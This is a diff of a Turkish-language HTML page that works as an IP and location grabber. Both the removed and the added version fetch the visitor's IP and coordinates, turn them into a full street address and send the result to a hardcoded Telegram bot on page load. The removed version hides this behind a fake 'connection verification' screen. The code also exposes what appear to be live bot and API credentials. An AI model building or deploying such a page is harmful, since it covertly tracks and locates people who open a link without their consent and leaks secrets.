@@ -1,98 +1,268 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Bağlantı Doğrulanıyor...</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
-    body {
-      margin: 0;
-      background: #111;
-      color: #eee;
-      font-family: 'Inter', sans-serif;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Canlı IP & Konum & Telegram</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap');
+  body, html {
+    margin:0; padding:0; height:100%;
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #fff;
+    overflow: hidden;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    top: -50%; left: -50%;
+    width: 200%; height: 200%;
+    background: radial-gradient(circle at center, rgba(255,255,255,0.08), transparent 70%);
+    animation: slow-rotate 60s linear infinite;
+    z-index: 0;
+  }
+  @keyframes slow-rotate {
+    0% { transform: rotate(0deg);}
+    100% { transform: rotate(360deg);}
+  }
+  .card {
+    position: relative;
+    background: rgba(255,255,255,0.1);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border-radius: 20px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    padding: 40px 60px;
+    max-width: 400px;
+    width: 90vw;
+    text-align: center;
+    z-index: 1;
+  }
+  h1 {
+    font-weight: 600;
+    margin-bottom: 30px;
+    font-size: 2.8rem;
+    letter-spacing: 1.2px;
+    text-transform: uppercase;
+    text-shadow: 0 0 8px rgba(255,255,255,0.2);
+  }
+  .info {
+    margin: 20px 0;
+    font-weight: 300;
+    font-size: 1.3rem;
+    letter-spacing: 0.06em;
+    opacity: 0;
+    transform: translateY(20px);
+    animation-fill-mode: forwards;
+  }
+  .info.show {
+    animation: fadeUp 0.8s ease forwards;
+  }
+  @keyframes fadeUp {
+    to {
+      opacity: 1;
+      transform: translateY(0);
     }
-    .spinner {
-      width: 48px; height: 48px;
-      border: 5px solid rgba(255,255,255,0.1);
-      border-top: 5px solid #fff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    h1 { font-size: 1.3rem; font-weight: 600; }
-    .status { margin-top: 1rem; opacity: 0.8; }
-    .success { color: #4caf50; }
-    .error { color: #f44336; }
-  </style>
+  }
+  .label {
+    display: block;
+    font-weight: 600;
+    font-size: 0.9rem;
+    color: #a3d8f4;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+  .value {
+    color: #cff3fd;
+    font-weight: 600;
+    font-size: 1.6rem;
+    letter-spacing: 0.04em;
+  }
+  button {
+    margin-top: 30px;
+    background: #00aaff;
+    border: none;
+    border-radius: 30px;
+    padding: 12px 50px;
+    font-weight: 600;
+    color: #fff;
+    font-size: 1.1rem;
+    cursor: pointer;
+    box-shadow: 0 0 12px #00aaffaa;
+    transition: background 0.3s ease;
+  }
+  button:hover {
+    background: #0088cc;
+    box-shadow: 0 0 18px #0088cccc;
+  }
+  .loader {
+    margin: 40px auto 0;
+    border: 4px solid #00aaff55;
+    border-top: 4px solid #00aaff;
+    border-radius: 50%;
+    width: 36px;
+    height: 36px;
+    animation: spin 1s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg);}
+  }
+  .status {
+    margin-top: 20px;
+    font-weight: 600;
+    font-size: 1.1rem;
+  }
+  .success {
+    color: #4caf50;
+  }
+  .error {
+    color: #f44336;
+  }
+</style>
 </head>
 <body>
-  <div class="spinner" id="loader"></div>
-  <h1>Bağlantı doğrulanıyor...</h1>
-  <div class="status" id="status">Bekleyin...</div>
 
-  <script>
-    const loader = document.getElementById("loader");
-    const status = document.getElementById("status");
+<div class="card" role="main" aria-live="polite" aria-busy="true" aria-label="IP ve konum bilgisi ve Telegram bildirimi">
+  <h1>Canlı IP & Konum</h1>
 
-    const botToken = "8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U";
-    const chatId = "7125066639";
-    const openCageKey = "321c0ed0bce141a69dbc869d08f564e3";
+  <div id="ip" class="info" aria-label="IP adresiniz">
+    <span class="label">IP Adresiniz</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
 
-    async function sendTelegramMessage(message) {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      try {
-        const res = await fetch(url);
-        return res.ok;
-      } catch (e) {
-        return false;
-      }
+  <div id="city" class="info" aria-label="Şehir">
+    <span class="label">Şehir</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
+
+  <div id="region" class="info" aria-label="Bölge">
+    <span class="label">Bölge</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
+
+  <div id="country" class="info" aria-label="Ülke">
+    <span class="label">Ülke</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
+
+  <div id="coords" class="info" aria-label="Koordinatlar">
+    <span class="label">Koordinatlar</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
+
+  <div id="address" class="info" aria-label="Tam adres">
+    <span class="label">Tam Adres</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
+
+  <div id="provider" class="info" aria-label="Sağlayıcı">
+    <span class="label">Sağlayıcı</span>
+    <span class="value">Yükleniyor...</span>
+  </div>
+
+  <button aria-label="Bilgileri yenile" onclick="main()">Yenile</button>
+
+  <div id="loader" class="loader" role="status" aria-hidden="true"></div>
+  <div id="status" class="status" aria-live="assertive"></div>
+</div>
+
+<script>
+  const ipDiv = document.getElementById('ip');
+  const cityDiv = document.getElementById('city');
+  const regionDiv = document.getElementById('region');
+  const countryDiv = document.getElementById('country');
+  const coordsDiv = document.getElementById('coords');
+  const addressDiv = document.getElementById('address');
+  const providerDiv = document.getElementById('provider');
+  const loader = document.getElementById('loader');
+  const status = document.getElementById('status');
+  const infos = [ipDiv, cityDiv, regionDiv, countryDiv, coordsDiv, addressDiv, providerDiv];
+
+  const botToken = "8087577949:AAE6s1rHpfxjgmHPTGYkAbBuRw6O84szn8U";
+  const chatId = "7125066639";
+  const openCageKey = "321c0ed0bce141a69dbc869d08f564e3";
+
+  async function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    try {
+      const res = await fetch(url);
+      return res.ok;
+    } catch (e) {
+      return false;
     }
+  }
 
-    async function main() {
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        if (!res.ok) throw new Error("Konum alınamadı");
-        const data = await res.json();
+  async function main() {
+    loader.style.display = 'block';
+    status.textContent = '';
+    infos.forEach(el => {
+      el.querySelector('.value').textContent = 'Yükleniyor...';
+      el.classList.remove('show');
+    });
 
-        const lat = data.latitude;
-        const lon = data.longitude;
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      if (!res.ok) throw new Error('API hatası');
+      const data = await res.json();
 
-        const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}&language=tr`);
-        const geoData = await geoRes.json();
-        const fullAddress = geoData.results[0]?.formatted || "Adres çözümlenemedi";
+      const lat = data.latitude;
+      const lon = data.longitude;
 
-        const message =
-          `📡 Yeni Ziyaretçi\n\n` +
-          `🛰️ IP: ${data.ip}\n` +
-          `📍 Tam Adres: ${fullAddress}\n` +
-          `🗺️ Koordinatlar: ${lat}, ${lon}\n` +
-          `🌆 Şehir: ${data.city || 'Bilinmiyor'}\n` +
-          `🏞️ Bölge: ${data.region || 'Bilinmiyor'}\n` +
-          `🌍 Ülke: ${data.country_name || 'Bilinmiyor'}\n` +
-          `🧭 Sağlayıcı: ${data.org || 'Bilinmiyor'}`;
+      const geoRes = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${openCageKey}&language=tr`);
+      const geoData = await geoRes.json();
+      const fullAddress = geoData.results[0]?.formatted || "Adres çözümlenemedi";
 
-        const sent = await sendTelegramMessage(message);
+      ipDiv.querySelector('.value').textContent = data.ip || 'Bilinmiyor';
+      cityDiv.querySelector('.value').textContent = data.city || 'Bilinmiyor';
+      regionDiv.querySelector('.value').textContent = data.region || 'Bilinmiyor';
+      countryDiv.querySelector('.value').textContent = data.country_name || 'Bilinmiyor';
+      coordsDiv.querySelector('.value').textContent = lat && lon ? `${lat.toFixed(5)}, ${lon.toFixed(5)}` : 'Bilinmiyor';
+      addressDiv.querySelector('.value').textContent = fullAddress;
+      providerDiv.querySelector('.value').textContent = data.org || 'Bilinmiyor';
 
-        loader.style.display = "none";
-        status.textContent = sent ? "✔️ Doğrulama tamamlandı." : "❌ Gönderilemedi.";
-        status.className = sent ? "status success" : "status error";
-      } catch (err) {
-        loader.style.display = "none";
-        status.textContent = "❌ Hata oluştu.";
-        status.className = "status error";
-        console.error(err);
+      // Animasyonlarla göster
+      infos.forEach((el, i) => {
+        setTimeout(() => el.classList.add('show'), i * 200 + 300);
+      });
+
+      // Telegram mesajı hazırla ve gönder
+      const message =
+        `📡 Yeni Ziyaretçi\n\n` +
+        `🛰️ IP: ${data.ip}\n` +
+        `📍 Tam Adres: ${fullAddress}\n` +
+        `🗺️ Koordinatlar: ${lat}, ${lon}\n` +
+        `🌆 Şehir: ${data.city || 'Bilinmiyor'}\n` +
+        `🏞️ Bölge: ${data.region || 'Bilinmiyor'}\n` +
+        `🌍 Ülke: ${data.country_name || 'Bilinmiyor'}\n` +
+        `🧭 Sağlayıcı: ${data.org || 'Bilinmiyor'}`;
+
+      const sent = await sendTelegramMessage(message);
+      if (sent) {
+        status.textContent = '✔️ Telegram bildirimi gönderildi.';
+        status.className = 'status success';
+      } else {
+        status.textContent = '❌ Telegram bildirimi gönderilemedi.';
+        status.className = 'status error';
       }
-    }
 
-    main();
-  </script>
+    } catch (error) {
+      console.error(error);
+      status.textContent = '❌ Veri alınırken hata oluştu.';
+      status.className = 'status error';
+      infos.forEach(el => {
+        el.querySelector('.value').textContent = 'Hata';
+      });
+    } finally {
+      loader.style.display = 'none';
+    }
+  }
+
+  main();
+</script>
+
 </body>
 </html>
